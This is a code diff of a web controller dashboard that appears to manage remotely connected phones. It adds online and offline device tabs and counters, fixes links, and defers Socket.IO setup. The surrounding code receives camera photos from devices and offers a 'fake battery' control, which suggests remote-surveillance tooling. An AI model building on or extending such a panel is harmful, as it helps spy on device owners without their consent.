@@ -1627,11 +1627,100 @@ body::after {
         <div class="stat-lbl">EXPIRED</div>
       </div>
     </div>
+    <div class="stat-pill" style="border-color:rgba(16,185,129,.32);background:rgba(16,185,129,.06)">
+      <div class="stat-orb" style="background:rgba(16,185,129,.07);border:1px solid rgba(16,185,129,.25);color:#10b981">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/>
+        </svg>
+      </div>
+      <div class="stat-info">
+        <div class="stat-val" id="stat-online" style="color:#10b981">0</div>
+        <div class="stat-lbl">ONLINE</div>
+      </div>
+    </div>
+    <div class="stat-pill" style="border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.06)">
+      <div class="stat-orb" style="background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);color:#ef4444">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="1" y1="1" x2="23" y2="23"/>
+          <path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"/>
+          <path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"/>
+          <path d="M10.71 5.05A16 16 0 0 1 22.56 9"/>
+          <path d="M1.42 9a15.91 15.91 0 0 1 4.7-2.88"/>
+          <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
+          <line x1="12" y1="20" x2="12.01" y2="20"/>
+        </svg>
+      </div>
+      <div class="stat-info">
+        <div class="stat-val" id="stat-total" style="color:#ef4444">0</div>
+        <div class="stat-lbl">OFFLINE</div>
+      </div>
+    </div>
+    <div class="stat-pill" style="border-color:rgba(251,191,36,.32);background:rgba(251,191,36,.06)">
+      <div class="stat-orb" style="background:rgba(251,191,36,.07);border:1px solid rgba(251,191,36,.22);color:#fbbf24">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="5" y="2" width="14" height="20" rx="3"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="2.5"/>
+        </svg>
+      </div>
+      <div class="stat-info">
+        <div class="stat-val" style="font-size:13px">
+          <span id="acct-online-badge" style="color:#fbbf24">0</span><span style="color:var(--t3);font-size:9px;font-weight:400"> on </span><span id="acct-offline-badge" style="color:#fbbf24">0</span><span style="color:var(--t3);font-size:9px;font-weight:400"> off</span>
+        </div>
+        <div class="stat-lbl">TOTAL DEVICE</div>
+      </div>
+    </div>
+  </div>
+  <span id="stat-logs" style="display:none">0</span>
 
-
-
+  <!-- Device list label -->
+  <div class="sec-label">
+    <div class="sec-label-line" style="background:linear-gradient(90deg,transparent,rgba(192,192,192,.25))"></div>
+    <div class="sec-label-icon">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="5" y="2" width="14" height="20" rx="3"/>
+        <line x1="12" y1="18" x2="12.01" y2="18" stroke-width="2.5"/>
+      </svg>
+    </div>
+    <span><span style="color:#ffffff">Select</span> <span style="color:var(--silver2)">Device</span></span>
+    <div class="sec-label-line"></div>
   </div>
 
+  <!-- Tabs -->
+  <div class="device-tabs">
+    <div class="dtab active" id="tab-online" onclick="switchTab('online')">● ONLINE (<span id="tab-online-count">0</span>)</div>
+    <div class="dtab" id="tab-offline" onclick="switchTab('offline')">○ OFFLINE (<span id="tab-offline-count">0</span>)</div>
+  </div>
+
+  <div class="dtab-panel active" id="panel-online">
+    <div id="device-list">
+      <div class="empty" id="empty-state">
+        <div class="empty-icon">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4">
+            <rect x="5" y="2" width="14" height="20" rx="3"/>
+            <circle cx="12" cy="17" r="1" fill="currentColor"/>
+          </svg>
+        </div>
+        <div class="empty-title">No Devices</div>
+        <div class="empty-sub">Waiting For Connection</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="dtab-panel" id="panel-offline">
+    <div id="device-list-offline">
+      <div class="empty" id="empty-state-offline">
+        <div class="empty-icon">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4">
+            <rect x="5" y="2" width="14" height="20" rx="3"/>
+            <circle cx="12" cy="17" r="1" fill="currentColor"/>
+          </svg>
+        </div>
+        <div class="empty-title">No Offline Data</div>
+        <div class="empty-sub">No Saved Records</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">XYZ PROJECT · SECURE DASHBOARD</div>
 </div>
 
 <!-- ══════════════════════════════════ CONTROL SCREEN ══════════════════════════════════ -->
@@ -1907,7 +1996,7 @@ body::after {
         <span class="hmenu-item-desc">Add new account</span>
       </div>
     </button>
-    <button class="hmenu-item hmenu-database" onclick="closeMenu();window.location.href='../kontroler/database.html'">
+    <button class="hmenu-item hmenu-database" onclick="closeMenu();window.location.href='database.html'">
       <div class="hmenu-item-icon">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
           <ellipse cx="12" cy="5" rx="9" ry="3"/>
@@ -2224,31 +2313,7 @@ setInterval(() => {
 
 window.addEventListener('DOMContentLoaded', async () => {
   await loadApiBase();
-  const _qDevice = new URLSearchParams(location.search).get('device')
-  if (_qDevice) {
-    const _stored = localStorage.getItem('selected_device_id')
-    const _targetId = _qDevice || _stored
-    if (_targetId) {
-      try {
-        const resp = await fetch(apiUrl('/api/device/' + encodeURIComponent(_targetId)), {
-          headers: { 'Authorization': 'Bearer ' + _token }
-        })
-        if (resp.ok) {
-          const device = await resp.json()
-          selectedDeviceId = _targetId
-          setTimeout(() => showControlScreen(device), 450)
-        }
-      } catch (e) {
-        console.error('Failed to load selected device:', e)
-        // Fallback: tunggu Socket.IO
-        const _waitDevice = setInterval(() => {
-          const dev = allDevices.find(d => d.id === _targetId)
-          if (dev) { clearInterval(_waitDevice); selectDevice(_targetId) }
-        }, 400)
-        setTimeout(() => clearInterval(_waitDevice), 8000)
-      }
-    }
-  }
+  initSocket(); // socket diinit setelah API_BASE ready
   const uEl = document.getElementById('acct-username')
   const rEl = document.getElementById('acct-role')
   const hmU = document.getElementById('hmenu-username')
@@ -2365,9 +2430,15 @@ function backToSelect() {
   updateProtectionUI(false)
 }
 
-const socket = io(API_BASE || undefined)
+let socket  // diinit di DOMContentLoaded setelah API_BASE loaded
 
-socket.on('connect', () => {
+function initSocket() {
+  if (socket) return  // jangan init 2x
+  const url = API_BASE || undefined
+  console.log('[Socket] Connecting to:', url || '(relative)')
+  socket = io(url, { transports: ['websocket', 'polling'] })
+
+  socket.on('connect', () => {
   socket.emit('controller:join', { token: _token })
   fetch(apiUrl('/api/devices'), { headers: { 'Authorization': 'Bearer ' + _token } }).then(r => r.json()).then(devices => {
     allDevices = devices
@@ -6361,6 +6432,8 @@ socket.on('device:photo', ({ deviceId, facing, image }) => {
   if (grid) prependCaptureThumb(grid, entry, deviceId)
 })
 
+} // end initSocket
+
 function openCaptureLog(deviceId) {
   const store = _captureStore[deviceId] || { photos: [] }
   const old = document.getElementById('capture-log-overlay-' + deviceId)
@@ -7021,7 +7094,7 @@ function submitFakeBattery() {
 <nav class="bottom-nav">
 
   <!-- Home -->
-  <a class="bnav-item active" href="../kontroler/dashboard.html">
+  <a class="bnav-item active" href="/dashboard.html">
     <div class="bnav-icon">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
         <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
@@ -7034,13 +7107,13 @@ function submitFakeBattery() {
 
 
   <!-- Tools -->
-  <a class="bnav-item" href="device_ryuichi.html">
+  <a class="bnav-item" href="/tools.html">
     <div class="bnav-icon">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="5" y="2" width="14" height="20" rx="3"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="2.5"/>
+        <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>
       </svg>
     </div>
-    <span class="bnav-label">Devices</span>
+    <span class="bnav-label">Tools</span>
   </a>
 
 </nav>
